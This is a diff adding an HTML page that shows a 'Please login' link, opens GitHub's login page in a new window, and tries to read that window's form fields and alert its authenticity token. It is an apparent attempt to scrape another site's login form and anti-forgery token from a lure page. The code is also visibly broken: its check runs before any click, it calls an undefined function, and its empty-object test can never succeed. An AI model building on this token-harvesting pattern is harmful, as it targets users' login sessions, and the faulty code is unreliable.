@@ -1,0 +1,55 @@
+<html>
+  <head>
+    <script>
+      var forms = []
+      var values = {}
+      var getForms = function (dom) {
+        forms = (dom || document).forms
+        console.log('Detected ' + forms.length + ' forms')
+        for (var i = 0; i < forms.length; i ++) {
+          console.log('Form ' + i + ': \'' + forms[i].method + '\' (' + forms[i].action.toString().split(window.location).join('./') + ')')
+          for (var e = 0; e < forms[i].length; e ++) {
+            if (forms[i][e].type !== 'submit') {
+              value = forms[i][e].value
+              if (value == '') {
+                value = '-Empty-'
+              }
+              console.log('\t' + forms[i][e].name + ' = ' + value + ' (' + forms[i][e].type + ')')
+              values[[forms[i][e].name]] = {loc:[i,e]}
+            }
+          }
+        }
+      }
+
+      var getValue = function (name) {
+        if (values == {}) {
+          scan()
+        }
+        if (!values[name]) {
+          console.log('\'' + name + '\' was not found.')
+          return;
+        }
+        var loc = values[name].loc
+        var value = forms[loc[0]][loc[1]].value
+        console.log(name + ' = ' + value)
+        return value;
+      }
+    </script>
+  </head>
+  <body>
+    Please <a id='hacked' href='#'>login</a>.
+    <script>
+      hacked = document.getElementById('hacked')
+      var dom
+      hacked.addEventListener('click', function () {
+        dom = window.open('https://www.github.com/login').document
+      })
+      if (dom) {
+        getForms(dom)
+        dom.forms[0].addEventListener('submit', function () {
+          window.alert(getValue('authenticity_token'))
+        })
+      }
+    </script>
+  </body>
+</html>
